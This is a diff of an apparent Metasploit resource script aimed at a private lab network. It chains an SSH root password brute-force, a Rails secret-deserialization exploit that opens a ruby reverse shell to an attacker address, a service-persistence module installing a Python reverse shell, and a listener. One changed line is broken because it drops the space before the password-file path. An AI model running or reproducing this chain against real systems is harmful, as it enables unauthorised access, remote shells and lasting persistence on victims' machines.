@@ -6,7 +6,7 @@ use auxiliary/scanner/ssh/ssh_login
 set RHOSTS 192.168.56.181
 set RPORT 22
 set USERNAME root
-set PASS_FILE /home/ahnafrr/Desktop/attackmate/unix_passwords_modified.txt
+set PASS_FILE/home/ahnafrr/Desktop/msf/unix_passwords_modified.txt
 run
 
 # ============================================================
@@ -14,7 +14,7 @@ run
 # ============================================================
 
 use exploit/multi/http/rails_secret_deserialization
-set payload ruby/shell_reverse_tcp
+set PAYLOAD ruby/shell_reverse_tcp
 set LHOST 192.168.56.191
 set LPORT 4444
 set RHOSTS 192.168.56.181
@@ -36,7 +36,7 @@ run
 # ============================================================
 
 use exploit/linux/local/service_persistence
-set payload cmd/unix/reverse_python
+set PAYLOAD cmd/unix/reverse_python
 set SESSION 1
 set VERBOSE True
 set LHOST 192.168.56.191
@@ -49,7 +49,7 @@ sessions -k 1,2,3
 # ============================================================
 
 use exploit/multi/handler
-set payload cmd/unix/reverse_python
+set PAYLOAD cmd/unix/reverse_python
 set SESSION 4
 set VERBOSE True
 set LHOST 192.168.56.191
